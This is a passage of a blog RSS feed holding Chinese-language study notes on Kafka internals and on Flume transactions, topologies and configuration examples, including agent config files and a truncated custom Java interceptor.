bin/kafka-console-producer.sh \--broker-list hadoop102:9092 --topic first<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​     （3）在hadoop102、hadoop103上分别启动消费者</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly hadoop104 kafka<span class="token punctuation">]</span>$ bin/kafka-console-consumer.sh \bootstrap-server hadoop102:9092 --topic first --consumer.config config/consumer.properties<span class="token punctuation">[</span>molly hadoop104 kafka<span class="token punctuation">]</span>$ bin/kafka-console-consumer.sh --bootstrap-server hadoop102:9092 --topic first --consumer.config config/consumer.properties<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    （4）查看hadoop102和hadoop103的消费者的消费情况。</p><h2 id="4-Kafka-高效读写数据"><a href="#4-Kafka-高效读写数据" class="headerlink" title="4 Kafka 高效读写数据"></a>4 Kafka 高效读写数据</h2><p>1）顺序写磁盘</p><p>Kafka的producer生产数据，要写入到log文件中，写的过程是一直追加到文件末端，为顺序写。官网有数据表明，同样的磁盘，顺序写能到600M/s，而随机写只有100K/s。这与磁盘的机械机构有关，顺序写之所以快，是因为其省去了大量磁头寻址的时间。</p><p>2）应用 </p><p>Kafka数据持久化是直接持久化到Pagecache中，这样会产生以下几个好处： </p><p>Ø I/O Scheduler 会将连续的小块写组装成大块的物理写从而提高性能</p><p>Ø I/O Scheduler 会尝试将一些写操作重新按顺序排好，从而减少磁盘头的移动时间</p><p>Ø 充分利用所有空闲内存（非 JVM 内存）。如果使用应用层 Cache（即 JVM 堆内存），会增加 GC 负担</p><p>Ø 读操作可直接在 Page Cache 内进行。如果消费和生产速度相当，甚至不需要通过物理磁盘（直接通过 Page Cache）交换数据</p><p>Ø 如果进程重启，JVM 内的 Cache 会失效，但 Page Cache 仍然可用</p><p>尽管持久化到Pagecache上可能会造成宕机丢失数据的情况，但这可以被Kafka的Replication机制解决。如果为了保证这种情况下数据不丢失而强制将 Page Cache 中的数据 Flush 到磁盘，反而会降低性能。</p><p>3）零复制技术</p><p>  <img src="/2020/11/16/bigdata-kafka2-framework/1637307730229.png" alt="1637307730229"></p><h2 id="5-Zookeeper在Kafka中的作用"><a href="#5-Zookeeper在Kafka中的作用" class="headerlink" title="5 Zookeeper在Kafka中的作用"></a>5 Zookeeper在Kafka中的作用</h2><p>Kafka集群中有一个broker会被选举为Controller，负责管理集群broker的上下线，所有topic的分区副本分配和leader选举等工作。</p><p>Controller的管理工作都是依赖于Zookeeper的。</p><p>​    以下为partition的leader选举过程：</p><p> <img src="/2020/11/16/bigdata-kafka2-framework/1637307712652.png" alt="1637307712652"></p><h2 id="6-Kafka事务"><a href="#6-Kafka事务" class="headerlink" title="6 Kafka事务"></a>6 Kafka事务</h2><p>Kafka从0.11版本开始引入了事务支持。事务可以保证Kafka在Exactly Once语义的基础上，生产和消费可以跨分区和会话，要么`全部成功，要么全部失败。</p><h3 id="6-1-Producer事务"><a href="#6-1-Producer事务" class="headerlink" title="6.1 Producer事务"></a>6.1 Producer事务</h3><p>为了实现跨分区跨会话的事务，需要引入一个全局唯一的Transaction ID，并将Producer获得的PID和Transaction ID绑定。这样当Producer重启后就可以通过正在进行的Transaction ID获得原来的PID。</p><p>为了管理Transaction，Kafka引入了一个新的组件Transaction Coordinator。Producer就是通过和Transaction Coordinator交互获得Transaction ID对应的任务状态。Transaction Coordinator还负责将事务所有写入Kafka的一个内部Topic，这样即使整个服务重启，由于事务状态得到保存，进行中的事务状态可以得到恢复，从而继续进行。</p><h3 id="6-2-Consumer事务（精准一次性消费）"><a href="#6-2-Consumer事务（精准一次性消费）" class="headerlink" title="6.2 Consumer事务（精准一次性消费）"></a>6.2 Consumer事务（精准一次性消费）</h3><p>上述事务机制主要是从Producer方面考虑，对于Consumer而言，事务的保证就会相对较弱，尤其时无法保证Commit的信息被精确消费。这是由于Consumer可以通过offset访问任意信息，而且不同的Segment File生命周期不同，同一事务的消息可能会出现重启后被删除的情况。</p><p>如果想完成Consumer端的精准一次性消费，那么需要kafka消费端将消费过程和提交offset过程做原子绑定。此时我们需要将kafka的offset保存到支持事务的自定义介质（比如mysql）。这部分知识会在后续项目部分涉及。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://baijiahao.baidu.com/s?id=1714208809060474800&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1714208809060474800&amp;wfr=spider&amp;for=pc</a></p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/kafka/">kafka</category>
      
      
      <comments>https://m01ly.github.io/2020/11/16/bigdata-kafka2-framework/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>flume学习笔记（二） flum事务和部署架构解析</title>
      <link>https://m01ly.github.io/2020/11/15/bigdata-flume2-framework/</link>
      <guid>https://m01ly.github.io/2020/11/15/bigdata-flume2-framework/</guid>
      <pubDate>Sun, 15 Nov 2020 08:46:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-Flume事务"><a href="#1-Flume事务" class="headerlink" title="1 Flume事务"></a><strong>1 Flume事务</strong></h2><p>一提到事务，首先就想到的是关系型数据库中的事务，事务一个典型的特征就是将一批操作做成原子性的，要么都成功，要么都失败。</p><p>flume事务就是保证fllume能安全正常的运行，保证服务的可靠性，安全性。</p><p>在Flume中一共有两个事务:</p><ul><li>Put事务：在Source到Channel之间</li><li>Take事务：Channel到Sink之间</li></ul><p>从Source到Channel过程中，数据在Flume中会被封装成Event对象，也就是一批Event，把这批Event放到一个事务中，把这个事务也就是这批event一次性的放入Channel中。同理，Take事务的时候，也是把这一批event组成的事务统一拿出来到sink放到HDFS上。</p><p>事务具体流程如下图所示：</p><p><strong><img src="/2020/11/15/bigdata-flume2-framework/1637064771603.png" alt="1637064771603"></strong></p><h4 id="1-1-Put事务流程"><a href="#1-1-Put事务流程" class="headerlink" title="1.1 Put事务流程"></a>1.1 Put事务流程</h4><ul><li><p>事务开始的时候会调用一个doPut 方法，doPut方法将一批数据放在putList中;</p></li><li><ul><li>putList在向Channel发送数据之前先检查Channel的容量能否放得下，如果放不下一个都不放，只能doRollback;</li><li>数据批的大小取决于配置参数batch size的值;</li><li>putList的大小取决于配置Channel的参数transaction capacity的大小，该参数大小就体现在putList上;(Channel的另一个参数capacity指的是Channel的容量);</li></ul></li><li><p>数据顺利的放到putList之后，Flume中的 Take 事务</p><p>Take事务同样也有takeList，HDFS sink配置有一个batch size，这个参数决定Sink从Channel 取数据的时候一次取多少个，所以该batch size得小于takeList的大小，而takeList的大小取决于 transaction capacity 的大小，同样是channel中的参数。其中putlist，takelist容量可以通过下面配置：a3.channels.c3.transactionCapacity = 100</p></li></ul><h4 id="1-2-Take事务流程"><a href="#1-2-Take事务流程" class="headerlink" title="1.2 Take事务流程:"></a>1.2 Take事务流程:</h4><p>  事务开始后</p><ul><li><p>doTake方法会将channel中的event剪切到takeList中。如果后面接的是HDFS Sink的话，在把Channel中的event剪切到takeList中的同时也往写入HDFS的IO缓冲流中放一份event(数据写入HDFS是先写入IO缓冲流然后flush到HDFS);</p></li><li><p>当takeList中存放了batch size 数量的event之后，就会调用doCommit方法，doCommit方法会做两个操作:</p></li><li><ul><li>针对HDFS Sink，手动调用IO流的flush方法，将IO流缓冲区的数据写入到HDFS磁盘中;</li><li>清空takeList中的数据</li></ul><p>flush到HDFS的时候组容易出问题。flush到HDFS的时候，可能由于网络原因超时导致数据传输失败，这个时候调用doRollback方法来进行回滚，回滚的时候由于takeList中还有备份数据，所以将takeList中的数据原封不动地还给channel，这时候就完成了事务的回滚。</p><p>但是，如果flush到HDFS的时候，数据flush了一半之后出问题了，这意味着已经有一半的数据已经发送到HDFS上面了，现在出了问题，同样需要调用doRollback方法来进行回滚，回滚并没有“一半”之说，它只会把整个takeList中的数据返回给 channel，然后继续进行数据的读写。这样开启下一个事务的时候容易造成数据重复的问题。接下来可以调用doCommit方法，把putList中所有的Event放到 Channel 中，成功放完之后就清空putList;</p></li></ul><p>在doCommit提交之后，事务在向Channel存放数据的过程中，事务容易出问题。如Sink取数据慢，而Source放数据速度快，容易造成Channel中数据的积压，如果putList中的数据放不进去，会如何呢?</p><p>此时会调用 doRollback 方法，doRollback方法会进行两项操作：将putList清空; 抛出 ChannelException异常。source会捕捉到doRollback抛出的异常，然后source就将刚才的一批数据重新采集，然后重新开始一个新的事务，这就是事务的回滚。</p><h2 id="2-Flume-Agent内部原理"><a href="#2-Flume-Agent内部原理" class="headerlink" title="2 Flume Agent内部原理"></a>2 Flume Agent内部原理</h2><p><img src="/2020/11/15/bigdata-flume2-framework/1637065765693.png" alt="1637065765693"></p><p>重要组件：</p><p>1）ChannelSelector</p><p>ChannelSelector的作用就是选出Event将要被发往哪个Channel。其共有两种类型，分别是Replicating（复制）和Multiplexing（多路复用）。</p><p>ReplicatingSelector会将同一个Event发往所有的Channel，Multiplexing会根据相应的原则，将不同的Event发往不同的Channel。</p><p>2）SinkProcessor</p><p>SinkProcessor共有三种类型，分别是DefaultSinkProcessor、LoadBalancingSinkProcessor和FailoverSinkProcessor</p><p>DefaultSinkProcessor对应的是单个的Sink，LoadBalancingSinkProcessor和FailoverSinkProcessor对应的是Sink Group，</p><p>LoadBalancingSinkProcessor可以实现负载均衡的功能：利用一定算法将channel均衡的分配到sink上；</p><p>FailoverSinkProcessor可以错误恢复的功能：三个中只有一个是Active的sink,如果当前acticve的sink故障了，另外两台通过选举的方式上位，成为新的sink（选举的指标是配置文件中a1.sinkgroups.g1.processor.priority.k1）。</p><h2 id="3-Flume拓扑结构"><a href="#3-Flume拓扑结构" class="headerlink" title="3 Flume拓扑结构"></a>3 Flume拓扑结构</h2><p>在实际应用中，根据不同的场景，可能部署多个flume实现功能，很多个flume使用的搭配结果如下：</p><h3 id="3-1-简单串联"><a href="#3-1-简单串联" class="headerlink" title="3.1 简单串联"></a>3.1 简单串联</h3><p><strong><img src="/2020/11/15/bigdata-flume2-framework/clip_image002.jpg" alt="img"></strong></p><p>这种模式是将多个flume顺序连接起来了，从最初的source开始到最终sink传送的目的存储系统。此模式不建议桥接过多的flume数量， flume数量过多不仅会影响传输速率，而且一旦传输过程中某个节点flume宕机，会影响整个传输系统。</p><h3 id="3-2-复制和多路复用"><a href="#3-2-复制和多路复用" class="headerlink" title="3.2 复制和多路复用"></a><strong>3.2 复制和多路复用</strong></h3><p><strong><img src="/2020/11/15/bigdata-flume2-framework/clip_image004.jpg" alt="img"></strong></p><p>Flume支持将事件流向一个或者多个目的地。这种模式可以将相同数据复制到多个channel中，或者将不同数据分发到不同的channel中，sink可以选择传送到不同的目的地。</p><h3 id="3-3-负载均衡和故障转移"><a href="#3-3-负载均衡和故障转移" class="headerlink" title="3.3 负载均衡和故障转移"></a><strong>3.3 负载均衡和故障转移</strong></h3><p><strong><img src="/2020/11/15/bigdata-flume2-framework/clip_image006.jpg" alt="img"></strong></p><hr><p>Flume支持使用将多个sink逻辑上分到一个sink组，sink组配合不同的SinkProcessor可以实现负载均衡和错误恢复的功能。</p><h3 id="3-4-聚合"><a href="#3-4-聚合" class="headerlink" title="3.4 聚合"></a><strong>3.4 聚合</strong></h3><p><strong><img src="/2020/11/15/bigdata-flume2-framework/clip_image008.jpg" alt="img"></strong></p><p>这种模式是我们最常见的，也非常实用，日常web应用通常分布在上百个服务器，大者甚至上千个、上万个服务器。产生的日志，处理起来也非常麻烦。用flume的这种组合方式能很好的解决这一问题，每台服务器部署一个flume采集日志，传送到一个集中收集日志的flume，再由此flume上传到hdfs、hive、hbase等，进行日志分析。</p><h2 id="4-Flume开发案例"><a href="#4-Flume开发案例" class="headerlink" title="4 Flume开发案例"></a><strong>4 Flume开发案例</strong></h2><h3 id="4-1-复制"><a href="#4-1-复制" class="headerlink" title="4.1 复制"></a>4.1 复制</h3><p><strong>1）案例需求</strong></p><p>使用Flume-1监控文件变动，Flume-1将变动内容传递给Flume-2，Flume-2负责存储到HDFS。同时Flume-1将变动内容传递给Flume-3，Flume-3负责输出到Local FileSystem。</p><p><strong>2）需求分析：</strong></p><p><strong><img src="/2020/11/15/bigdata-flume2-framework/clip_image002.png" alt="img"></strong></p><p>具体类型选择如下图所示：</p><p><strong><img src="/2020/11/15/bigdata-flume2-framework/1637066888396.png" alt="1637066888396"></strong></p><p>3）实现步骤：</p><p>（1）准备工作</p><p>在/opt/module/flume/job目录下创建group1文件夹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 job<span class="token punctuation">]</span>$ <span class="token function">cd</span> group1/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在/opt/module/datas/目录下创建flume3文件夹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 datas<span class="token punctuation">]</span>$ <span class="token function">mkdir</span> flume3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）创建flume-file-flume.conf</p><p>配置1个接收日志文件的source和两个channel、两个sink，分别输送给flume-flume-hdfs和flume-flume-dir。</p><p>编辑配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 group1<span class="token punctuation">]</span>$ vim flume-file-flume.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加如下内容</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Name the components on this agent</span>a1.sources <span class="token operator">=</span> r1a1.sinks <span class="token operator">=</span> k1 k2a1.channels <span class="token operator">=</span> c1 c2<span class="token comment" spellcheck="true"># 将数据流复制给所有channel</span>a1.sources.r1.selector.type <span class="token operator">=</span> replicating<span class="token comment" spellcheck="true"># Describe/configure the source</span>a1.sources.r1.type <span class="token operator">=</span> <span class="token function">exec</span>a1.sources.r1.command <span class="token operator">=</span> <span class="token function">tail</span> -F /opt/module/hive/logs/hive.loga1.sources.r1.shell <span class="token operator">=</span> /bin/bash -c<span class="token comment" spellcheck="true"># Describe the sink</span><span class="token comment" spellcheck="true"># sink端的avro是一个数据发送者</span>a1.sinks.k1.type <span class="token operator">=</span> avroa1.sinks.k1.hostname <span class="token operator">=</span> hadoop102 a1.sinks.k1.port <span class="token operator">=</span> 4141a1.sinks.k2.type <span class="token operator">=</span> avroa1.sinks.k2.hostname <span class="token operator">=</span> hadoop102a1.sinks.k2.port <span class="token operator">=</span> 4142<span class="token comment" spellcheck="true"># Describe the channel</span>a1.channels.c1.type <span class="token operator">=</span> memorya1.channels.c1.capacity <span class="token operator">=</span> 1000a1.channels.c1.transactionCapacity <span class="token operator">=</span> 100a1.channels.c2.type <span class="token operator">=</span> memorya1.channels.c2.capacity <span class="token operator">=</span> 1000a1.channels.c2.transactionCapacity <span class="token operator">=</span> 100<span class="token comment" spellcheck="true"># Bind the source and sink to the channel</span>a1.sources.r1.channels <span class="token operator">=</span> c1 c2a1.sinks.k1.channel <span class="token operator">=</span> c1a1.sinks.k2.channel <span class="token operator">=</span> c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）创建flume-flume-hdfs.conf</p><p>配置上级Flume输出的Source，输出是到HDFS的Sink。</p><p>编辑配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 group1<span class="token punctuation">]</span>$ vim flume-flume-hdfs.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加如下内容</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Name the components on this agent</span>a2.sources <span class="token operator">=</span> r1a2.sinks <span class="token operator">=</span> k1a2.channels <span class="token operator">=</span> c1<span class="token comment" spellcheck="true"># Describe/configure the source</span><span class="token comment" spellcheck="true"># source端的avro是一个数据接收服务</span>a2.sources.r1.type <span class="token operator">=</span> avroa2.sources.r1.bind <span class="token operator">=</span> hadoop102a2.sources.r1.port <span class="token operator">=</span> 4141<span class="token comment" spellcheck="true"># Describe the sink</span>a2.sinks.k1.type <span class="token operator">=</span> hdfsa2.sinks.k1.hdfs.path <span class="token operator">=</span> hdfs://hadoop102:8020/flume2/%Y%m%d/%H<span class="token comment" spellcheck="true">#上传文件的前缀</span>a2.sinks.k1.hdfs.filePrefix <span class="token operator">=</span> flume2-<span class="token comment" spellcheck="true">#是否按照时间滚动文件夹</span>a2.sinks.k1.hdfs.round <span class="token operator">=</span> <span class="token boolean">true</span><span class="token comment" spellcheck="true">#多少时间单位创建一个新的文件夹</span>a2.sinks.k1.hdfs.roundValue <span class="token operator">=</span> 1<span class="token comment" spellcheck="true">#重新定义时间单位</span>a2.sinks.k1.hdfs.roundUnit <span class="token operator">=</span> hour<span class="token comment" spellcheck="true">#是否使用本地时间戳</span>a2.sinks.k1.hdfs.useLocalTimeStamp <span class="token operator">=</span> <span class="token boolean">true</span><span class="token comment" spellcheck="true">#积攒多少个Event才flush到HDFS一次</span>a2.sinks.k1.hdfs.batchSize <span class="token operator">=</span> 100<span class="token comment" spellcheck="true">#设置文件类型，可支持压缩</span>a2.sinks.k1.hdfs.fileType <span class="token operator">=</span> DataStream<span class="token comment" spellcheck="true">#多久生成一个新的文件</span>a2.sinks.k1.hdfs.rollInterval <span class="token operator">=</span> 600<span class="token comment" spellcheck="true">#设置每个文件的滚动大小大概是128M</span>a2.sinks.k1.hdfs.rollSize <span class="token operator">=</span> 134217700<span class="token comment" spellcheck="true">#文件的滚动与Event数量无关</span>a2.sinks.k1.hdfs.rollCount <span class="token operator">=</span> 0<span class="token comment" spellcheck="true"># Describe the channel</span>a2.channels.c1.type <span class="token operator">=</span> memorya2.channels.c1.capacity <span class="token operator">=</span> 1000a2.channels.c1.transactionCapacity <span class="token operator">=</span> 100<span class="token comment" spellcheck="true"># Bind the source and sink to the channel</span>a2.sources.r1.channels <span class="token operator">=</span> c1a2.sinks.k1.channel <span class="token operator">=</span> c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（4）创建flume-flume-dir.conf</p><p>配置上级Flume输出的Source，输出是到本地目录的Sink。</p><p>编辑配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 group1<span class="token punctuation">]</span>$ vim flume-flume-dir.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加如下内容</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Name the components on this agent</span>a3.sources <span class="token operator">=</span> r1a3.sinks <span class="token operator">=</span> k1a3.channels <span class="token operator">=</span> c2<span class="token comment" spellcheck="true"># Describe/configure the source</span>a3.sources.r1.type <span class="token operator">=</span> avroa3.sources.r1.bind <span class="token operator">=</span> hadoop102a3.sources.r1.port <span class="token operator">=</span> 4142<span class="token comment" spellcheck="true"># Describe the sink</span>a3.sinks.k1.type <span class="token operator">=</span> file_rolla3.sinks.k1.sink.directory <span class="token operator">=</span> /opt/module/data/flume3<span class="token comment" spellcheck="true"># Describe the channel</span>a3.channels.c2.type <span class="token operator">=</span> memorya3.channels.c2.capacity <span class="token operator">=</span> 1000a3.channels.c2.transactionCapacity <span class="token operator">=</span> 100<span class="token comment" spellcheck="true"># Bind the source and sink to the channel</span>a3.sources.r1.channels <span class="token operator">=</span> c2a3.sinks.k1.channel <span class="token operator">=</span> c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提示：输出的本地目录必须是已经存在的目录，如果该目录不存在，并不会创建新的目录。</p><p>（5）执行配置文件</p><p>分别启动对应的flume进程：flume-flume-dir，flume-flume-hdfs，flume-file-flume。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --conf conf/ --name a3 --conf-file job/group1/flume-flume-dir.conf<span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --conf conf/ --name a2 --conf-file job/group1/flume-flume-hdfs.conf<span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --conf conf/ --name a1 --conf-file job/group1/flume-file-flume.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（6）启动Hadoop和Hive</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-2.7.2<span class="token punctuation">]</span>$ sbin/start-dfs.sh<span class="token punctuation">[</span>molly@hadoop103 hadoop-2.7.2<span class="token punctuation">]</span>$ sbin/start-yarn.sh<span class="token punctuation">[</span>molly@hadoop102 hive<span class="token punctuation">]</span>$ bin/hivehive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> （7）检查HDFS上数据</p><p><img src="/2020/11/15/bigdata-flume2-framework/clip_image004-1637066740449.jpg" alt="img"></p><p>（8）检查/opt/module/datas/flume3目录中数据</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume3<span class="token punctuation">]</span>$ ll-rw-rw-r--. 1 molly molly 5942 5月 22 00:09 1526918887550-3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-2-多路复用-自定义Interceptor"><a href="#4-2-多路复用-自定义Interceptor" class="headerlink" title="4.2 多路复用+自定义Interceptor"></a>4.2 多路复用+自定义Interceptor</h3><p>1)案例需求</p><p>使用Flume采集服务器本地日志，需要按照日志类型的不同，将不同种类的日志发往不同的分析系统。</p><ol start="2"><li>需求分析</li></ol><p>在实际的开发中，一台服务器产生的日志类型可能有很多种，不同类型的日志可能需要发送到不同的分析系统。此时会用到Flume拓扑结构中的Multiplexing结构，Multiplexing的原理是，根据event中Header的某个key的值，将不同的event发送到不同的Channel中，所以我们需要自定义一个Interceptor，为不同类型的event的Header中的key赋予不同的值。</p><p>需求1 架构：在该案例中，我们以端口数据模拟日志，以数字（单个）和字母（单个）模拟不同类型的日志，我们需要自定义interceptor区分数字和字母，将其分别发往不同的分析系统（Channel）。</p><p><img src="/2020/11/15/bigdata-flume2-framework/1637118002481.png" alt="1637118002481"></p><p>需求2架构：</p><p><img src="/2020/11/15/bigdata-flume2-framework/1637068504415.png" alt="1637068504415"></p><ol start="3"><li>需求1实现步骤</li></ol><p>主要分为两大步：</p><p><strong>第一 使用拦截器对数据进行处理：对不同数据添加不同的head</strong></p><p><strong>第二：使用选择器将不同head的数据分发到不同的channel</strong></p><p>（1）创建一个maven项目，并引入以下依赖。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.flume<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>flume-ng-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.9.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）定义CustomInterceptor类并实现Interceptor接口。将写好的代码打包jar，并放到flume的lib目录（/opt/module/flume）下。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>Event<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span>Interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CustomInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">Interceptor</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Event <span class="token function">intercept</span><span class="token punctuation">(</span>Event event<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> body <span class="token operator">=</span> event<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>body<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'z'</span> <span class="token operator">&amp;&amp;</span> body<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            event<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"type"</span><span class="token punctuation">,</span> <span class="token string">"letter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>body<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> body<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'9'</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            event<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"type"</span><span class="token punctuation">,</span> <span class="token string">"number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> event<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> List<span class="token operator">&lt;</span>Event<span class="token operator">></span> <span class="token function">intercept</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>Event<span class="token operator">></span> events<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Event event <span class="token operator">:</span> events<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token function">intercept</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> events<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token 